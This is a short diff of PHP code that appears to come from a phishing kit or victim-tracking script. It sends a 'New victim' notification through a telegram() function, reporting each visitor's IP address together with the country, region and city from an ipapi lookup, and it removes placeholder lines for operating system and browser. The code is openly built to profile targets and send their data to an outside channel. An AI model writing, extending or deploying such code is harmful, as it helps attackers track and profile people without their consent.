@@ -22,8 +22,6 @@ $datetime = date("g:ia, l F j Y"); // g:ia l F j Y   l, F j, Y, g:ia
 telegram("New victim:
 
         IP  :  $ip
-        Operating system  :  replace in the sub comment
-        Browser  :  replace in the sub comment
         Country  :  $ipapi->country ($ipapi->countryCode)
         Region  :  $ipapi->regionName ($ipapi->region)
         City  :  $ipapi->city
